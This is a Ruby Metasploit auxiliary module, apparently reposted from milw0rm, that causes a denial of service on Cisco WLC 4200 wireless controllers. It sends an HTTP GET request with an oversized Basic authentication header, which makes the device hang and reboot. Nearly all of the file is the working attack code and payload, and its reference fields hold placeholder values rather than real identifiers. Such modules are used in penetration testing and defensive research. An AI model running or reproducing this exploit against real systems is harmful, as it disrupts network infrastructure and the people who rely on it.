require 'msf/core'


class Metasploit3 < Msf::Auxiliary

        include Msf::Exploit::Remote::Tcp
        include Msf::Auxiliary::Dos

        def initialize(info = {})
                super(update_info(info,
                        'Name'           => 'Cisco WLC 4200 Basic Auth Denial of Service',
                        'Description'    => %q{

                                This module triggers a Denial of Service condition in the Cisco WLC 4200
                                HTTP server. By sending a GET request with long authentication data, the
                                device becomes unresponsive and reboots.  Firmware is reportedly vulnerable.
                        },
                        'Author'                => [ 'Christoph Bott <msf[at]bott.syss.de>' ],
                        'License'        => MSF_LICENSE,
                        'Version'        => '$Revision: 5949 $',
                        'References'     =>
                                [
                                        [ 'BID', '???'],
                                        [ 'CVE', '???'],
                                        [ 'URL', 'http://www.cisco.com/?????'],
                                ],
                        'DisclosureDate' => 'January 26 2009'))

                register_options(
                        [
                                Opt::RPORT(80),
                        ], self.class)

        end

        def run
                connect

                print_status("Sending HTTP DoS packet")

                sploit =
                        "GET /screens/frameset.html HTTP/1.0\r\n" +
                        "Authorization: Basic MTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDoxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0"

                sock.put(sploit + "\r\n")

                disconnect
        end

end

# milw0rm.com [2009-07-27]